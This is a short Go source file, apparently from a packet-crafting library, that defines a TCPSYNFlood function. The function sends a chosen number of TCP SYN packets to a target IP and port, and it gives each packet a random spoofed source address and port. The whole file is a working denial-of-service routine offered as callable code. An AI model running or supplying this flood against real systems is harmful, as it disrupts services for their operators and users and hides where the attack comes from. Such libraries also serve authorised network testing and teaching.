package higherlevel

import (
	golayers "github.com/google/gopacket/layers"
	"github.com/tiagomdiogo/ScaGo/packet"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
)

func TCPSYNFlood(iface, targetIP, targetPort string, numberOfPackets int) {

	ipLayer := packet.IPv4Layer()
	ipLayer.SetDstIP(targetIP)
	ipLayer.SetProtocol(golayers.IPProtocolTCP)
	tcpLayer := packet.TCPLayer()
	tcpLayer.SetDstPort(targetPort)
	tcpLayer.SetSyn()

	for i := 0; i < numberOfPackets; i++ {
		ipLayer.SetSrcIP(utils.ParseIPGen())
		tcpLayer.SetSrcPort(utils.RandomPort())
		completePacket, _ := packet.CraftPacket(ipLayer.Layer(), tcpLayer.Layer())
		communication.Send(completePacket, iface)
	}
}
